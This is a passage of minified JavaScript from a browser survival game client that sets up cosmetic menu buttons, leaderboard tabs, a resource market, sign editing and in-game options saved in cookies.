                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 395, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, void 0, -61, 315, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, void 0, 260, 315, a | o, P),
                    this.buttons[e++].view = R,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(l)
                    }, -320, 470, a | o, P),
                    this.buttons[e++].view = R,
                    FIRST_BUTTON_BOOK = e,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 205, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 300, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 395, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 205, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 300, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 395, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 205, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 300, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 395, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, void 0, -61, 315, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, void 0, 260, 315, a | o, P),
                    this.buttons[e++].view = C,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(l)
                    }, -320, 470, a | o, P),
                    this.buttons[e++].view = C,
                    FIRST_BUTTON_CRATE = e,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 205, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 300, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, -29, 395, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 205, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 300, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 65, 395, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 205, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 300, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, void 0, 159, 395, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, void 0, -61, 315, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, void 0, 260, 315, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(l)
                    }, -320, 470, a | o, P),
                    this.buttons[e++].view = p,
                    this.buttons[e] = be(260, 260, 0, [IMAGES.SPIN_BUTTON_1_OUT, IMAGES.SPIN_BUTTON_1_IN, IMAGES.SPIN_BUTTON_1_CLICK], 1, 0, function () {
                        T.isUserLogged() ? ro(3, 50) : v(h)
                    }, -65, 197, a | o, P),
                    this.buttons[e++].view = j,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, 309, 180, a | o, P),
                    this.buttons[e++].view = j,
                    this.buttons[e] = be(260, 260, 0, [IMAGES.SPIN_BUTTON_2_OUT, IMAGES.SPIN_BUTTON_2_IN, IMAGES.SPIN_BUTTON_2_CLICK], 1, 0, function () {
                        T.isUserLogged() ? ro(0, 100) : v(h)
                    }, -65, 197, a | o, P),
                    this.buttons[e++].view = x,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, 309, 180, a | o, P),
                    this.buttons[e++].view = x,
                    this.buttons[e] = be(260, 260, 0, [IMAGES.SPIN_BUTTON_3_OUT, IMAGES.SPIN_BUTTON_3_IN, IMAGES.SPIN_BUTTON_3_CLICK], 1, 0, function () {
                        T.isUserLogged() ? ro(4, 150) : v(h)
                    }, -65, 197, a | o, P),
                    this.buttons[e++].view = J,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, 309, 180, a | o, P),
                    this.buttons[e++].view = J,
                    this.buttons[e] = be(260, 260, 0, [IMAGES.SPIN_BUTTON_4_OUT, IMAGES.SPIN_BUTTON_4_IN, IMAGES.SPIN_BUTTON_4_CLICK], 1, 0, function () {
                        T.isUserLogged() ? ro(1, 300) : v(h)
                    }, -65, 197, a | o, P),
                    this.buttons[e++].view = q,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, 309, 180, a | o, P),
                    this.buttons[e++].view = q,
                    this.buttons[e] = be(260, 260, 0, [IMAGES.SPIN_BUTTON_5_OUT, IMAGES.SPIN_BUTTON_5_IN, IMAGES.SPIN_BUTTON_5_CLICK], 1, 0, function () {
                        T.isUserLogged() ? ro(2, 600) : v(h)
                    }, -65, 197, a | o, P),
                    this.buttons[e++].view = X,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, 309, 180, a | o, P),
                    this.buttons[e++].view = X,
                    this.buttons[e] = be(260, 260, 0, [IMAGES.SPIN_BUTTON_4_OUT, IMAGES.SPIN_BUTTON_4_IN, IMAGES.SPIN_BUTTON_4_CLICK], 1, 0, function () {
                        T.isUserLogged() ? ro(5, 300) : v(h)
                    }, -65, 197, a | o, P),
                    this.buttons[e++].view = Z,
                    this.buttons[e] = be(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
                        v(I)
                    }, 309, 180, a | o, P),
                    this.buttons[e++].view = Z;
                var ae = e
                    , se = (this.buttons[e] = be(205, 67, 0, [IMAGES.SEASON1_PROFILE_OUT, IMAGES.SEASON1_PROFILE_IN, IMAGES.SEASON1_PROFILE_CLICK], 1, 0, function () {
                        _(void 0, 0)
                    }, -305, 125, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , _e = (this.buttons[e] = be(205, 67, 0, [IMAGES.SEASON2_PROFILE_OUT, IMAGES.SEASON2_PROFILE_IN, IMAGES.SEASON2_PROFILE_CLICK], 1, 0, function () {
                        _(void 0, 1)
                    }, -305, 170, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , Ee = (this.buttons[e] = be(205, 67, 0, [IMAGES.SEASON3_PROFILE_OUT, IMAGES.SEASON3_PROFILE_IN, IMAGES.SEASON3_PROFILE_CLICK], 1, 0, function () {
                        _(void 0, 2)
                    }, -305, 215, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , ue = (this.buttons[e] = be(205, 67, 0, [IMAGES.SEASON4_PROFILE_OUT, IMAGES.SEASON4_PROFILE_IN, IMAGES.SEASON4_PROFILE_CLICK], 1, 0, function () {
                        _(void 0, 3)
                    }, -305, 260, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , de = (this.buttons[e] = be(205, 67, 0, [IMAGES.SEASON5_PROFILE_OUT, IMAGES.SEASON5_PROFILE_IN, IMAGES.SEASON5_PROFILE_CLICK], 1, 0, function () {
                        _(void 0, 3)
                    }, -305, 305, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , Te = (this.buttons[e] = be(460, 73, 0, [IMAGES.TOTAL_PROFILE_OUT, IMAGES.TOTAL_PROFILE_IN, IMAGES.TOTAL_PROFILE_CLICK], 1, 0, function () {
                        _(-1)
                    }, -180, 170, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , Ae = (this.buttons[e] = be(222, 68, 0, [IMAGES.NORMAL_PROFILE_OUT, IMAGES.NORMAL_PROFILE_IN, IMAGES.NORMAL_PROFILE_CLICK], 1, 0, function () {
                        _(Ue.MODE_PVP)
                    }, -180, 215, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , he = (this.buttons[e] = be(222, 68, 0, [IMAGES.FOREST_PROFILE_OUT, IMAGES.FOREST_PROFILE_IN, IMAGES.FOREST_PROFILE_CLICK], 1, 0, function () {
                        _(Ue.MODE_LEGACY)
                    }, -180, 260, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , le = (this.buttons[e] = be(222, 68, 0, [IMAGES.ZOMBIE_PROFILE_OUT, IMAGES.ZOMBIE_PROFILE_IN, IMAGES.ZOMBIE_PROFILE_CLICK], 1, 0, function () {
                        _(Ue.MODE_ZOMBIES)
                    }, -60, 215, a | o, P),
                        this.buttons[e++].view = A,
                        e)
                    , Ie = (this.buttons[e] = be(222, 68, 0, [IMAGES.VAMPIRE_PROFILE_OUT, IMAGES.VAMPIRE_PROFILE_IN, IMAGES.VAMPIRE_PROFILE_CLICK], 1, 0, function () {
                        _(Ue.MODE_VAMPIRES)
                    }, -60, 260, a | o, P),
                        this.buttons[e++].view = A,
                        this.LEADERBOARD_TOTAL = e,
                        this.buttons[e] = be(143, 66, 0, [IMAGES.TOTAL_LEAD_OUT, IMAGES.TOTAL_LEAD_IN, IMAGES.TOTAL_LEAD_CLICK], 1, 0, function () {
                            _o(void 0, Se.LEADERBOARD_TOTAL)
                        }, -298, 110, a | o, P),
                        this.buttons[e++].view = O,
                        this.LEADERBOARD_NORMAL = e,
                        this.buttons[e] = be(104, 66, 0, [IMAGES.NORMAL_LEAD_OUT, IMAGES.NORMAL_LEAD_IN, IMAGES.NORMAL_LEAD_CLICK], 1, 0, function () {
                            _o(void 0, Se.LEADERBOARD_NORMAL)
                        }, -223, 110, a | o, P),
                        this.buttons[e++].view = O,
                        this.LEADERBOARD_FOREST = e,
                        this.buttons[e] = be(110, 66, 0, [IMAGES.FOREST_LEAD_OUT, IMAGES.FOREST_LEAD_IN, IMAGES.FOREST_LEAD_CLICK], 1, 0, function () {
                            _o(void 0, Se.LEADERBOARD_FOREST)
                        }, -168, 110, a | o, P),
                        this.buttons[e++].view = O,
                        this.LEADERBOARD_ZOMBIE = e,
                        this.buttons[e] = be(88, 66, 0, [IMAGES.ZOMBIE_LEAD_OUT, IMAGES.ZOMBIE_LEAD_IN, IMAGES.ZOMBIE_LEAD_CLICK], 1, 0, function () {
                            _o(void 0, Se.LEADERBOARD_ZOMBIE)
                        }, -110, 110, a | o, P),
                        this.buttons[e++].view = O,
                        this.LEADERBOARD_VAMPIRE = e,
                        this.buttons[e] = be(88, 66, 0, [IMAGES.VAMPIRE_LEAD_OUT, IMAGES.VAMPIRE_LEAD_IN, IMAGES.VAMPIRE_LEAD_CLICK], 1, 0, function () {
                            _o(void 0, Se.LEADERBOARD_VAMPIRE)
                        }, -63, 110, a | o, P),
                        this.buttons[e++].view = O,
                        this.buttons[e] = be(86, 44, 0, [IMAGES.TERMS_BUTTON_OUT, IMAGES.TERMS_BUTTON_IN, IMAGES.TERMS_BUTTON_CLICK], 1, 0, function () {
                            window.open("./terms.html", "_blank")
                        }, 349, 290, a | o, P),
                        this.buttons[e++].view = I,
                        new B(COSMETICS.SKIN, FIRST_BUTTON_SKIN, function (e) {
                            Se.skin = e,
                                1 === Se.unlock.skin[e] && Cookies.set("starve_skin", "" + e, {
                                    expires: 30
                                })
                        }
                            , this.skin, this.unlock.skin))
                    , ce = new B(COSMETICS.BAG, FIRST_BUTTON_BAG, function (e) {
                        Se.bag = e,
                            1 === Se.unlock.bag[e] && Cookies.set("starve_bag", "" + e, {
                                expires: 30
                            })
                    }
                        , this.bag, this.unlock.bag)
                    , Oe = new B(COSMETICS.BOOK, FIRST_BUTTON_BOOK, function (e) {
                        Se.book = e,
                            1 === Se.unlock.book[e] && Cookies.set("starve_book", "" + e, {
                                expires: 30
                            })
                    }
                        , this.book, this.unlock.book)
                    , ge = new B(COSMETICS.CRATE, FIRST_BUTTON_CRATE, function (e) {
                        Se.dead = e,
                            1 === Se.unlock.dead[e] && Cookies.set("starve_dead", "" + e, {
                                expires: 30
                            })
                    }
                        , this.dead, this.unlock.dead)
                    , pe = new B(COSMETICS.CRATE, FIRST_BUTTON_LOOT, function (e) {
                        Se.crate = e,
                            1 === Se.unlock.crate[e] && Cookies.set("starve_crate", "" + e, {
                                expires: 30
                            })
                    }
                        , this.crate, this.unlock.crate)
                    , Re = new B(COSMETICS.ACCESSORY, FIRST_BUTTON_ACCESSORY, function (e) {
                        Se.accessory = e,
                            1 === Se.unlock.accessory[e] && Cookies.set("starve_accessory", "" + e, {
                                expires: 30
                            })
                    }
                        , this.accessory, this.unlock.accessory);
                this.trigger_mousedown = function (e) {
                    je.pos = Zr(T.can, e);
                    for (var t = 0; t < T.buttons.length; t++)
                        T.buttons[t].info.active === z && T.buttons[t].trigger(T.can, je.pos, Jr)
                }
                    ,
                    this.trigger_mouseup = function (e) {
                        je.pos = Zr(T.can, e);
                        for (var t = 0; t < T.buttons.length; t++) {
                            var i = T.buttons[t];
                            if (i.info.active === z && i.trigger(T.can, je.pos, Xr))
                                return void i.info.callback()
                        }
                    }
                    ,
                    this.current_cursor = !1,
                    this.trigger_mousemove = function (e) {
                        je.pos = Zr(T.can, e);
                        for (var t = !1, i = 0; i < T.buttons.length; i++)
                            T.buttons[i].info.active === z && (t |= T.buttons[i].trigger(T.can, je.pos, xr));
                        T.current_cursor !== t && (T.current_cursor = t,
                            E.style.cursor = t ? T.cursor1 : T.cursor0)
                    }
                    ,
                    this.add_event_listener = function () {
                        window.addEventListener("mousedown", this.trigger_mousedown, !1),
                            window.addEventListener("mouseup", this.trigger_mouseup, !1),
                            window.addEventListener("mousemove", this.trigger_mousemove, !1)
                    }
                    ,
                    this.remove_event_listener = function () {
                        window.removeEventListener("mousedown", this.trigger_mousedown, !1),
                            window.removeEventListener("mouseup", this.trigger_mouseup, !1),
                            window.removeEventListener("mousemove", this.trigger_mousemove, !1)
                    }
            }
            function m2(a, Me) {
                var d = this;
                this.can = a,
                    this.ctx = Me,
                    -1 < window.navigator.userAgent.indexOf("Edge") ? (this.cursor0 = "default",
                        this.cursor1 = "pointer") : (this.cursor0 = "url('img/cursor0.png'), default",
                            this.cursor1 = "url('img/cursor1.png'), pointer"),
                    this.show_ui = 1,
                    this.show_clock = 1,
                    this.show_recipe_book = 1,
                    this.show_quest = 1,
                    this.team_box = {
                        id: document.getElementById("team_box"),
                        style: document.getElementById("team_box").style,
                        update: function () {
                            this.style.left = Math.floor(ye - 125) + "px",
                                this.style.top = "110px"
                        }
                    },
                    this.audio = {
                        button_on: be(60, 60, 0, sprite[ze.SOUND_BUTTON_ON]),
                        button_off: be(60, 60, 0, sprite[ze.SOUND_BUTTON_OFF])
                    },
                    this.sign = {
                        open: !1,
                        breads: 0,
                        symbol: document.getElementById("sign_object"),
                        symbol_id: 0,
                        id: document.getElementById("sign_window"),
                        style: document.getElementById("sign_window").style,
                        button: be(60, 60, 0, sprite[ze.SIGN_BUTTON]),
                        update_button: function () {
                            var e = Math.floor(Math.floor((3 + xe.craft.can_craft.length) / 4) * (10 + sprite[ze.INV_WOOD][0].width) + 35);
                            this.button.info.translate.x = e,
                                this.button.info.translate.y = 22
                        },
                        update: function () {
                            this.style.left = Math.floor(ye - 150) + "px",
                                this.style.top = Math.floor(He - 115) + "px"
                        },
                        quit: function () {
                            Je.sign.style.display = "none",
                                Je.sign.open = !1
                        },
                        select: function () {
                            Je.sign.open = !Je.sign.open,
                                Je.sign.open ? Je.sign.style.display = "inline-block" : Je.sign.style.display = "none"
                        },
                        ok: function () {
                            client.update_sign(xe.sign.iid, Je.sign.symbol_id),
                                Je.sign.select()
                        },
                        up: function () {
                            Je.sign.symbol_id = 0 === Je.sign.symbol_id ? i2.SYMBOL_MAX - 1 : Je.sign.symbol_id - 1,
                                Je.sign.symbol.src = "./img/sign" + Je.sign.symbol_id + ".png"
                        },
                        down: function () {
                            Je.sign.symbol_id = (Je.sign.symbol_id + 1) % i2.SYMBOL_MAX,
                                Je.sign.symbol.src = "./img/sign" + Je.sign.symbol_id + ".png"
                        }
                    },
                    document.getElementById("quit_sign").addEventListener("mouseup", this.sign.select, !1),
                    document.getElementById("ok_sign").addEventListener("mouseup", this.sign.ok, !1),
                    document.getElementById("sign_up").addEventListener("mouseup", this.sign.up, !1),
                    document.getElementById("sign_down").addEventListener("mouseup", this.sign.down, !1),
                    this.market = {
                        open: !1,
                        id: document.getElementById("shop_market"),
                        style: document.getElementById("shop_market").style,
                        items: [{
                            id: 0,
                            name: "wood",
                            val: 1,
                            b: 1,
                            a: 3,
                            img_item: ze.INV_WOOD
                        }, {
                            id: 1,
                            name: "stone",
                            val: 1,
                            b: 1,
                            a: 4,
                            img_item: ze.INV_STONE
                        }, {
                            id: 2,
                            name: "gold",
                            val: 1,
                            b: 1,
                            a: 6,
                            img_item: ze.INV_GOLD
                        }, {
                            id: 3,
                            name: "diamond",
                            val: 4,
                            b: 4,
                            a: 1,
                            img_item: ze.INV_DIAMOND
                        }, {
                            id: 4,
                            name: "amethyst",
                            val: 8,
                            b: 8,
                            a: 1,
                            img_item: ze.INV_AMETHYST
                        }, {
                            id: 5,
                            name: "reidite",
                            val: 16,
                            b: 16,
                            a: 1,
                            img_item: ze.INV_REIDITE
                        }, {
                            id: 6,
                            name: "pumpkin_seed",
                            val: 10,
                            b: 10,
                            a: 1,
                            img_item: ze.INV_PUMPKIN_SEED
                        }, {
                            id: 7,
                            name: "carrot_seed",
                            val: 16,
                            b: 16,
                            a: 1,
                            img_item: ze.INV_CARROT_SEED
                        }, {
                            id: 8,
                            name: "tomato_seed",
                            val: 20,
                            b: 20,
                            a: 1,
                            img_item: ze.INV_TOMATO_SEED
                        }, {
                            id: 9,
                            name: "thornbush_seed",
                            val: 30,
                            b: 30,
                            a: 1,
                            img_item: ze.INV_THORNBUSH_SEED
                        }, {
                            id: 10,
                            name: "garlic_seed",
                            val: 40,
                            b: 40,
                            a: 1,
                            img_item: ze.INV_GARLIC_SEED
                        }, {
                            id: 11,
                            name: "watermelon_seed",
                            val: 60,
                            b: 60,
                            a: 1,
                            img_item: ze.INV_WATERMELON_SEED
                        }],
                        button: be(60, 60, 0, sprite[ze.MARKET_BUTTON]),
                        update: function () {
                            this.style.left = Math.floor(ye - 450) + "px",
                                this.style.top = Math.floor(He - 270) + "px"
                        },
                        select: function () {
                            Je.market.open = !Je.market.open,
                                Je.market.open ? Je.market.style.display = "inline-block" : Je.market.style.display = "none"
                        },
                        quit: function () {
                            Je.market.style.display = "none",
                                Je.market.open = !1
                        },
                        buy: function () {
                            client.buy_market(this.itemMarket)
                        },
                        change: function () {
                            var e;
                            this.id,
                                e = 1 === this.itemMarket.a ? Math.floor(Number(this.value) * this.itemMarket.b) : Math.floor(Number(this.value) / this.itemMarket.a),
                                this.itemMarket.val = e,
                                document.getElementById(this.itemMarket.name + "_trad_number").innerHTML = e + ""
                        }
                    },
                    document.getElementById("quit_market").addEventListener("mouseup", this.market.quit, !1);
                for (var e = [["mouseup", this.market.buy, "buy_"], ["click", this.market.change, ""], ["change", this.market.change, ""], ["keypress", this.market.keypress, ""]], t = 0; t < this.market.items.length; t++) {
                    var i = this.market.items[t];
                    document.getElementById(i.name + "_market").src = void 0 === sprite[i.img_item][0]._src ? sprite[i.img_item][0].src : sprite[i.img_item][0]._src,
                        1 === i.a ? (document.getElementById(i.name + "_trad_number").innerHTML = i.b,
                            document.getElementById(i.name + "_number").value = 1,
                            document.getElementById(i.name + "_number").step = 1,
                            document.getElementById(i.name + "_number").min = 1,
                            document.getElementById(i.name + "_number").max = Math.floor(255 / i.b)) : (document.getElementById(i.name + "_trad_number").innerHTML = 1,
                                document.getElementById(i.name + "_number").value = i.a,
                                document.getElementById(i.name + "_number").step = i.a,
                                document.getElementById(i.name + "_number").min = i.a),
                        document.getElementById("buy_" + i.name + "_number").itemMarket = i,
                        document.getElementById(i.name + "_number").itemMarket = i;
                    for (var n = 0; n < e.length; n++)
                        document.getElementById(e[n][2] + i.name + "_number").addEventListener(e[n][0], e[n][1], !1)
                }
                for ($("[type='number']").keypress(function (e) {
                    e.preventDefault()
                }),
                    this.options = {
                        open: !1,
                        id: document.getElementById("option_in_game"),
                        style: document.getElementById("option_in_game").style,
                        agree: document.getElementById("agree_ing").style,
                        cancel_agree: document.getElementById("cancel_agree_ing").style,
                        quests_agree: document.getElementById("quest_agree_ing").style,
                        spectator_agree: document.getElementById("spectator_agree_ing").style,
                        feed_agree: document.getElementById("auto_feed_agree_ing").style,
                        info_box_agree: document.getElementById("info_agree_ing").style,
                        aliasing_agree: document.getElementById("pixelated_agree_ing").style,
                        button: be(60, 60, 0, sprite[ze.OPTION_BUTTON]),
                        select_options: function () {
                            Je.options.open = !Je.options.open,
                                Je.options.open ? Je.options.style.display = "inline-block" : Je.options.style.display = "none"
                        },
                        azerty: function () {
                            Se.set_azerty()
                        },
                        qwerty: function () {
                            Se.set_qwerty()
                        },
                        high: function () {
                            Se.high_quality()
                        },
                        low: function () {
                            Se.low_quality()
                        },
                        checkbox: function () {
                            Je.safe_delete.checkbox()
                        },
                        cancel_checkbox: function () {
                            Je.safe_cancel.checkbox()
                        },
                        quest_checkbox: function () {
                            Je.quests.checkbox()
                        },
                        spectator_checkbox: function () {
                            xe.show_spectators.invert()
                        },
                        feed_checkbox: function () {
                            xe.auto_feed.invert()
                        },
                        quit: function () {
                            Je.options.style.display = "none",
                                Je.options.open = !1
                        },
                        update: function () {
                            this.style.left = Math.floor(ye - 235) + "px",
                                this.style.top = Math.floor(He - 170) + "px"
                        }
                    },
                    document.getElementById("azerty_ing").addEventListener("mouseup", this.options.azerty, !1),
                    document.getElementById("qwerty_ing").addEventListener("mouseup", this.options.qwerty, !1),
                    document.getElementById("low_ing").addEventListener("mouseup", this.options.low, !1),
                    document.getElementById("high_ing").addEventListener("mouseup", this.options.high, !1),
                    document.getElementById("quit_opt").addEventListener("mouseup", this.options.quit, !1),
                    document.getElementById("case_agree_opt").addEventListener("mouseup", this.options.checkbox, !1),
                    document.getElementById("quest_case_agree_opt").addEventListener("mouseup", this.options.quest_checkbox, !1),
                    document.getElementById("cancel_case_agree_opt").addEventListener("mouseup", this.options.cancel_checkbox, !1),
                    document.getElementById("spectator_case_agree_opt").addEventListener("mouseup", this.options.spectator_checkbox, !1),
                    document.getElementById("auto_feed_case_agree_opt").addEventListener("mouseup", this.options.feed_checkbox, !1),
                    this.safe_cancel = {
                        open: !1,
                        activated: Cookies.get("starve_cancel") && "0" === Cookies.get("starve_cancel") ? 0 : 1,
                        id: document.getElementById("cancel_sure_delete"),
                        style: document.getElementById("cancel_sure_delete").style,
                        agree: document.getElementById("cancel_agree").style,
                        button: 0,
                        i: 0,
                        quit: function () {
                            Je.safe_cancel.style.display = "none",
                                Je.safe_cancel.open = !1
                        },
                        yes: function () {
                            xe.craft.crafting && client.cancel_crafting(),
                                Je.safe_cancel.quit()
                        },
                        checkbox: function () {
                            Je.safe_cancel.activated ? (Cookies.set("starve_cancel", "0"),
                                Je.safe_cancel.agree.display = "inline-block",
                                Je.options.cancel_agree.display = "none") : (Cookies.set("starve_cancel", "1"),
                                    Je.safe_cancel.agree.display = "none",
                                    Je.options.cancel_agree.display = "inline-block"),
                                Je.safe_cancel.activated = !Je.safe_cancel.activated
                        },
                        del: function () {
                            this.activated ? (this.style.display = "inline-block",
                                this.open = !0) : this.yes()
                        },
                        update: function () {
                            this.style.left = Math.floor(ye - 235) + "px",
                                this.style.top = Math.floor(He - 130) + "px"
                        }
                    },
                    this.safe_cancel.id.oncontextmenu = function () {
                        return !1
                    }
                    ,
                    this.safe_cancel.agree.display = "none",
                    this.safe_cancel.activated ? this.options.cancel_agree.display = "inline-block" : this.options.cancel_agree.display = "none",
                    document.getElementById("cancel_yes_delete").addEventListener("mouseup", this.safe_cancel.yes, !1),
                    document.getElementById("cancel_no_delete").addEventListener("mouseup", this.safe_cancel.quit, !1),
                    document.getElementById("cancel_case_agree").addEventListener("mouseup", this.safe_cancel.checkbox, !1),
                    document.addEventListener("cancel_sure_delete", function (e) {
                        e.preventDefault()
                    }, !1),
                    this.aliasing = {
                        activated: Cookies.get("starve_aliasing") && "0" === Cookies.get("starve_aliasing") ? 0 : 1,
                        set_aliasing: function (e) {
                            document.getElementById("game_canvas").style.imageRendering = e ? "pixelated" : "auto"
                        },
                        checkbox: function () {
                            0 === Je.aliasing.activated ? (Cookies.set("starve_aliasing", "1"),
                                Je.aliasing.set_aliasing(1),
                                Je.options.aliasing_agree.display = "inline-block") : (Cookies.set("starve_aliasing", "0"),
                                    Je.aliasing.set_aliasing(0),
                                    Je.options.aliasing_agree.display = "none"),
                                Je.aliasing.activated = (Je.aliasing.activated + 1) % 2
                        }
                    },
                    1 === this.aliasing.activated ? this.options.aliasing_agree.display = "inline-block" : (this.aliasing.set_aliasing(0),
                        this.options.aliasing_agree.display = "none"),
                    document.getElementById("pixelated_case_agree_opt").addEventListener("mouseup", this.aliasing.checkbox, !1),
                    this.info_box = {
                        activated: Cookies.get("starve_info_box") && "0" === Cookies.get("starve_info_box") ? 0 : 1,
                        display: 0,
                        x: 0,
                        y: 0,
                        id: 0,
                        craft: 0,
                        checkbox: function () {
